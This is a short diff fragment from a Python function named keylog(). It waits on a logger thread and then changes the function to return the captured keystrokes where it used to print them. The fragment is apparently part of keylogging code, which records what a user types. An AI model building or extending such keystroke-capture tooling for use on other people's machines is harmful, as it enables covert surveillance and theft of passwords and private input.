@@ -65,4 +65,4 @@ def keylog():
     while logger.isAlive():
         pass
 
-    print('sending: ', logger.keys_pressed)
+    return logger.keys_pressed
